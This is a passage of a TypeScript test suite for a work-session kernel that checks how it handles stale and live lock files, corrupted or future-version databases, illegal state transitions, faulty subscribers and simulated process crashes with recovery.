      const lockPath = path.join(dir, 'kernel.lock')
      // Write fake lock file with a non-existent PID (e.g. 99999999)
      const fakeLock = {
        kernelId: 'dead-kernel',
        pid: 99999999,
        acquiredAt: '2026-01-01T00:00:00.000Z',
        lastHeartbeatAt: '2026-01-01T00:00:00.000Z',
      }
      fs.writeFileSync(lockPath, JSON.stringify(fakeLock, null, 2), 'utf8')

      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await kernel.start()
      assert.equal(kernel.getLifecycleState(), 'READY')

      await kernel.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('ADV 08: Live process active in lock prevents second instance start', async () => {
    const dir = createTempDir('adv-08')
    try {
      const lockPath = path.join(dir, 'kernel.lock')
      // Write lock file with CURRENT process PID
      const liveLock = {
        kernelId: 'live-kernel',
        pid: process.pid,
        acquiredAt: new Date().toISOString(),
        lastHeartbeatAt: new Date().toISOString(),
      }
      fs.writeFileSync(lockPath, JSON.stringify(liveLock, null, 2), 'utf8')

      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await assert.rejects(async () => {
        await kernel.start()
      }, (err: unknown) => err instanceof DataRootLockedError)
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('ADV 09: Corrupted database file detected via integrity check fail-closed', async () => {
    const dir = createTempDir('adv-09')
    try {
      const dbPath = path.join(dir, 'gravitas_kernel.db')
      // Write garbage bytes
      fs.writeFileSync(dbPath, 'NOT A REAL SQLITE DATABASE FILE GARBAGE BYTES')

      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await assert.rejects(async () => {
        await kernel.start()
      }, (err: unknown) => err instanceof DatabaseCorruptionError)
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('ADV 10: Future schema version rejected without downgrade attempt', async () => {
    const dir = createTempDir('adv-10')
    try {
      const dbPath = path.join(dir, 'gravitas_kernel.db')
      const db = new DatabaseSync(dbPath)
      db.exec(`
        CREATE TABLE schema_migrations (
          version INTEGER PRIMARY KEY,
          applied_at TEXT NOT NULL,
          description TEXT NOT NULL
        );
        INSERT INTO schema_migrations (version, applied_at, description)
        VALUES (42, '2026-10-01T00:00:00.000Z', 'Future schema');
      `)
      db.close()

      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await assert.rejects(async () => {
        await kernel.start()
      }, (err: unknown) => err instanceof SchemaVersionUnsupportedError)
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('ADV 11: Rapid concurrent command execution retains monotonic sequence numbers', async () => {
    const dir = createTempDir('adv-11')
    try {
      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await kernel.start()

      await kernel.executeCommand({
        commandId: 'cmd-ws-adv-11',
        type: 'CREATE_WORK_SESSION',
        workSessionId: 'ws-adv-11',
        payload: { title: 'Batch test' },
      })
      await kernel.executeCommand({
        commandId: 'cmd-run-adv-11',
        type: 'CREATE_RUN',
        workSessionId: 'ws-adv-11',
        payload: { runId: 'run-adv-11' },
      })

      // Create 10 tasks sequentially
      for (let i = 1; i <= 10; i++) {
        await kernel.executeCommand({
          commandId: `cmd-task-adv-11-${i}`,
          type: 'CREATE_TASK',
          workSessionId: 'ws-adv-11',
          payload: { taskId: `task-adv-11-${i}`, runId: 'run-adv-11', title: `Task ${i}` },
        })
      }

      const events = kernel.getEventsForSession('ws-adv-11')
      assert.equal(events.length, 12)
      for (let i = 0; i < events.length; i++) {
        assert.equal(events[i]?.sequenceNumber, i + 1)
      }

      await kernel.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('ADV 12: Terminal state rejection: cannot transition from COMPLETED', async () => {
    const dir = createTempDir('adv-12')
    try {
      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await kernel.start()

      await kernel.executeCommand({
        commandId: 'cmd-ws-adv-12',
        type: 'CREATE_WORK_SESSION',
        workSessionId: 'ws-adv-12',
        payload: { title: 'Terminal' },
      })
      await kernel.executeCommand({
        commandId: 'cmd-p-adv-12',
        type: 'TRANSITION_WORK_SESSION',
        workSessionId: 'ws-adv-12',
        expectedRevision: 1,
        payload: { targetState: 'READY' },
      })
      await kernel.executeCommand({
        commandId: 'cmd-a-adv-12',
        type: 'TRANSITION_WORK_SESSION',
        workSessionId: 'ws-adv-12',
        expectedRevision: 2,
        payload: { targetState: 'ACTIVE' },
      })
      await kernel.executeCommand({
        commandId: 'cmd-c-adv-12',
        type: 'TRANSITION_WORK_SESSION',
        workSessionId: 'ws-adv-12',
        expectedRevision: 3,
        payload: { targetState: 'COMPLETED' },
      })

      // Cannot move out of COMPLETED
      await assert.rejects(async () => {
        await kernel.executeCommand({
          commandId: 'cmd-illegal-adv-12',
          type: 'TRANSITION_WORK_SESSION',
          workSessionId: 'ws-adv-12',
          expectedRevision: 4,
          payload: { targetState: 'ACTIVE' },
        })
      }, (err: unknown) => err instanceof InvalidWorkSessionTransitionError)

      await kernel.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('ADV 13: Terminal state rejection: cannot transition from CANCELLED', async () => {
    const dir = createTempDir('adv-13')
    try {
      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await kernel.start()

      await kernel.executeCommand({
        commandId: 'cmd-ws-adv-13',
        type: 'CREATE_WORK_SESSION',
        workSessionId: 'ws-adv-13',
        payload: { title: 'Cancel test' },
      })
      await kernel.executeCommand({
        commandId: 'cmd-can-adv-13',
        type: 'TRANSITION_WORK_SESSION',
        workSessionId: 'ws-adv-13',
        expectedRevision: 1,
        payload: { targetState: 'CANCELLED' },
      })

      await assert.rejects(async () => {
        await kernel.executeCommand({
          commandId: 'cmd-illegal-adv-13',
          type: 'TRANSITION_WORK_SESSION',
          workSessionId: 'ws-adv-13',
          expectedRevision: 2,
          payload: { targetState: 'READY' },
        })
      }, (err: unknown) => err instanceof InvalidWorkSessionTransitionError)

      await kernel.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('ADV 14: Terminal state rejection: cannot transition from FAILED', async () => {
    const dir = createTempDir('adv-14')
    try {
      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await kernel.start()

      await kernel.executeCommand({
        commandId: 'cmd-ws-adv-14',
        type: 'CREATE_WORK_SESSION',
        workSessionId: 'ws-adv-14',
        payload: { title: 'Fail test' },
      })
      await kernel.executeCommand({
        commandId: 'cmd-r-adv-14',
        type: 'TRANSITION_WORK_SESSION',
        workSessionId: 'ws-adv-14',
        expectedRevision: 1,
        payload: { targetState: 'READY' },
      })
      await kernel.executeCommand({
        commandId: 'cmd-a-adv-14',
        type: 'TRANSITION_WORK_SESSION',
        workSessionId: 'ws-adv-14',
        expectedRevision: 2,
        payload: { targetState: 'ACTIVE' },
      })
      await kernel.executeCommand({
        commandId: 'cmd-fail-adv-14',
        type: 'TRANSITION_WORK_SESSION',
        workSessionId: 'ws-adv-14',
        expectedRevision: 3,
        payload: { targetState: 'FAILED' },
      })

      await assert.rejects(async () => {
        await kernel.executeCommand({
          commandId: 'cmd-illegal-adv-14',
          type: 'TRANSITION_WORK_SESSION',
          workSessionId: 'ws-adv-14',
          expectedRevision: 4,
          payload: { targetState: 'ACTIVE' },
        })
      }, (err: unknown) => err instanceof InvalidWorkSessionTransitionError)

      await kernel.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('ADV 15: Command execution while STOPPED throws KernelNotReadyError', async () => {
    const dir = createTempDir('adv-15')
    try {
      const kernel = new WorkSessionKernel({ dataRoot: dir })
      // Notice: not started

      await assert.rejects(async () => {
        await kernel.executeCommand({
          commandId: 'cmd-adv-15',
          type: 'CREATE_WORK_SESSION',
          workSessionId: 'ws-adv-15',
          payload: { title: 'Stopped test' },
        })
      }, (err: unknown) => err instanceof KernelNotReadyError)
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('ADV 16: Multiple subscribers receive events independently', async () => {
    const dir = createTempDir('adv-16')
    try {
      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await kernel.start()

      const sub1Events: string[] = []
      const sub2Events: string[] = []

      const un1 = kernel.subscribe((e) => sub1Events.push(e.eventId))
      const un2 = kernel.subscribe((e) => sub2Events.push(e.eventId))

      await kernel.executeCommand({
        commandId: 'cmd-adv-16',
        type: 'CREATE_WORK_SESSION',
        workSessionId: 'ws-adv-16',
        payload: { title: 'Multi-sub' },
      })

      assert.equal(sub1Events.length, 1)
      assert.equal(sub2Events.length, 1)
      assert.equal(sub1Events[0], sub2Events[0])

      un1()
      await kernel.executeCommand({
        commandId: 'cmd-p-adv-16',
        type: 'TRANSITION_WORK_SESSION',
        workSessionId: 'ws-adv-16',
        expectedRevision: 1,
        payload: { targetState: 'READY' },
      })

      assert.equal(sub1Events.length, 1) // Unsubscribed
      assert.equal(sub2Events.length, 2) // Still subscribed

      un2()
      await kernel.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('ADV 17: Faulty subscriber throwing error does not break kernel command execution', async () => {
    const dir = createTempDir('adv-17')
    try {
      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await kernel.start()

      // Faulty subscriber throws synchronously
      kernel.subscribe(() => {
        throw new Error('Subscriber intentional explosion!')
      })

      const res = await kernel.executeCommand({
        commandId: 'cmd-adv-17',
        type: 'CREATE_WORK_SESSION',
        workSessionId: 'ws-adv-17',
        payload: { title: 'Faulty subscriber resilience' },
      })

      assert.equal(res.success, true)
      assert.equal(res.currentRevision, 1)

      await kernel.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('ADV 18: Zero unhandled promise rejections on duplicate start call', async () => {
    const dir = createTempDir('adv-18')
    try {
      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await kernel.start()
      // Redundant start is a no-op
      await kernel.start()
      assert.equal(kernel.getLifecycleState(), 'READY')

      await kernel.shutdown()
      // Redundant shutdown is a no-op
      await kernel.shutdown()
      assert.equal(kernel.getLifecycleState(), 'STOPPED')
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('ADV 19: Payload with extreme JSON size and special characters persists faithfully', async () => {
    const dir = createTempDir('adv-19')
    try {
      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await kernel.start()

      const largeDescription = 'A'.repeat(50000)
      const specialGoal = 'Unicode: 🚀💥💎, EscapedNull: \\0, Quotes: "\'\\//\b\f\n\r\t'

      await kernel.executeCommand({
        commandId: 'cmd-adv-19',
        type: 'CREATE_WORK_SESSION',
        workSessionId: 'ws-adv-19',
        payload: {
          title: 'Extreme payload',
          goal: specialGoal,
          metadata: { description: largeDescription },
        },
      })

      const ws = kernel.getWorkSession('ws-adv-19')
      assert.equal(ws?.objective, specialGoal)
      assert.equal((ws?.metadata as any)?.description, largeDescription)

      await kernel.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('ADV 20: Heartbeat update and lock touch prevents premature lock expiration', async () => {
    const dir = createTempDir('adv-20')
    try {
      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await kernel.start()

      const lockPath = path.join(dir, 'kernel.lock')
      const initialLock = JSON.parse(fs.readFileSync(lockPath, 'utf8'))

      // Wait 10ms and touch lock
      await new Promise((r) => setTimeout(r, 10))
      kernel['lock'].touch()

      const updatedLock = JSON.parse(fs.readFileSync(lockPath, 'utf8'))
      assert.ok(updatedLock.lastHeartbeatAt >= initialLock.lastHeartbeatAt)

      await kernel.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  // =========================================================================
  // Section 33 — Real Process-Crash Fault Injection Tests (CRASH-A through CRASH-E)
  // =========================================================================

  await t.test('CRASH-A: Process terminates before SQLite transaction commit -> mutation absent after restart', async () => {
    const dir = createTempDir('crash-a')
    try {
      // Spawn fault worker which begins transaction, writes row, and dies before COMMIT
      runFaultWorker('CRASH_A', dir)

      // Start kernel in main process against same dataRoot
      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await kernel.start()

      // The uncommitted WorkSession must be completely absent (rolled back by SQLite WAL)
      assert.throws(() => {
        kernel.getWorkSessionSnapshot('ws-crash-a')
      }, (err: unknown) => err instanceof WorkSessionNotFoundError)

      await kernel.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('CRASH-B: Transaction commits, process terminates before response -> retry with same commandId succeeds without duplicate side-effects', async () => {
    const dir = createTempDir('crash-b')
    try {
      // Spawn fault worker which executes command, commits to disk, then dies
      runFaultWorker('CRASH_B', dir)

      // Start new kernel against same dataRoot
      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await kernel.start()

      // WorkSession was committed before process death
      const ws = kernel.getWorkSession('ws-crash-b')
      assert.ok(ws)
      assert.equal(ws.id, 'ws-crash-b')

      // Retry exact command with same commandId
      const retryRes = await kernel.executeCommand({
        commandId: 'cmd-crash-b',
        type: 'CREATE_WORK_SESSION',
        workSessionId: 'ws-crash-b',
        payload: { title: 'Crash B Session', goal: 'Committed but process died' },
      })
      assert.equal(retryRes.status, 'ALREADY_COMMITTED')
      assert.equal(retryRes.success, true)

      // Verify events were not duplicated
      const events = kernel.getEventsForSession('ws-crash-b')
      assert.equal(events.length, 1)

      // Reused commandId with different payload fails closed
      await assert.rejects(async () => {
        await kernel.executeCommand({
          commandId: 'cmd-crash-b',
          type: 'CREATE_WORK_SESSION',
          workSessionId: 'ws-crash-b',
          payload: { title: 'Conflicting mutation' },
        })
      }, (err: unknown) => err instanceof CommandConflictError)

      await kernel.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('CRASH-C: Job lease commits, Kernel process dies -> restart/reconciliation marks lease EXPIRED', async () => {
    const dir = createTempDir('crash-c')
    try {
      // Spawn fault worker which leases job and abruptly dies
      runFaultWorker('CRASH_C', dir)

      // Start new kernel
      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await kernel.start()

      const report = kernel.getLastReconciliationReport()
      assert.ok(report)
      assert.equal(report.recoveredJobsCount, 1)

      const expiredJobs = kernel.getDurableJobsByState('EXPIRED')
      assert.equal(expiredJobs.length, 1)
      assert.equal(expiredJobs[0]?.id, 'job-crash-c')

      await kernel.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('CRASH-D: WorkSession reaches WAITING_APPROVAL, process dies uncleanly -> restart preserves WAITING_APPROVAL intact', async () => {
    const dir = createTempDir('crash-d')
    try {
      // Spawn fault worker which advances session to WAITING_APPROVAL then dies
      runFaultWorker('CRASH_D', dir)

      // Start new kernel
      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await kernel.start()

      const ws = kernel.getWorkSession('ws-crash-d')
      assert.ok(ws)
      assert.equal(ws.state, 'WAITING_APPROVAL')

      const report = kernel.getLastReconciliationReport()
      assert.ok(report)
      assert.equal(report.preservedApprovalSessionsCount, 1)

      await kernel.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })

  await t.test('CRASH-E: Kernel dies while WorkSession ACTIVE / Task RUNNING -> reconciled to RECOVERY_REQUIRED / INTERRUPTED exactly once', async () => {
    const dir = createTempDir('crash-e')
    try {
      // Spawn fault worker which leaves session ACTIVE and task RUNNING then terminates
      runFaultWorker('CRASH_E', dir)

      // Start new kernel
      const kernel = new WorkSessionKernel({ dataRoot: dir })
      await kernel.start()

      const report = kernel.getLastReconciliationReport()
      assert.ok(report)
      assert.equal(report.interruptedTasksCount, 1)
      assert.equal(report.interruptedSessionsCount, 1)

      const ws = kernel.getWorkSession('ws-crash-e')
      assert.equal(ws?.state, 'RECOVERY_REQUIRED')

      const snapshot = kernel.getWorkSessionSnapshot('ws-crash-e')
      assert.equal(snapshot.tasks[0]?.state, 'INTERRUPTED')

      // Second restart is completely idempotent
      await kernel.shutdown()
      const k2 = new WorkSessionKernel({ dataRoot: dir })
      await k2.start()

      const report2 = k2.getLastReconciliationReport()
      assert.equal(report2?.interruptedTasksCount, 0)
      assert.equal(report2?.interruptedSessionsCount, 0)

      await k2.shutdown()
    } finally {
      cleanTempDir(dir)
    }
  })
})
